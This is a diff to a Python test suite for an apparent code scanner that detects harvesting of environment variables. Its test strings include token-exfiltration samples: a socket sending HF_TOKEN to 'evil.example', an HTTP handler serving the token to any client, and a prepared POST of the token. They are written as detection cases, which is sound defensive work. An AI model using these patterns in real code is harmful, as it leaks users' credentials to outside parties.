@@ -3149,6 +3149,14 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
         'import os\nimport socket\n' + hub
         + 's = socket.socket()\ns.connect(("evil.example", 443))\n'
         + 's.send(os.environ["HF_TOKEN"].encode())\n',
+        # http.server names no destination at all: it serves the token to
+        # whoever connects. The network rule recognises it, so leaving it out of
+        # the refusal let a handler hand HF_TOKEN to inbound clients beside a hub
+        # literal and produce no finding.
+        'import os\nimport http.server\n' + hub
+        + 'class H(http.server.BaseHTTPRequestHandler):\n'
+        + '    def do_GET(self):\n'
+        + '        self.send_header("X-Token", os.environ["HF_TOKEN"])\n',
     ):
         assert any(
             "Harvests environment variables" in f.check
@@ -3275,6 +3283,14 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     assert _findings(
         's = requests.Session()\n'
         's.request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
+    )
+    # A prepared request carries its method in an argument rather than in the
+    # name of the call, so Session.send() is a write that neither the named
+    # methods nor .request() covered.
+    assert _findings(
+        's = requests.Session()\n'
+        'r = requests.Request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
+        's.send(r.prepare())\n'
     )
     assert _findings(
         'requests.get(HUB, params = {\n'
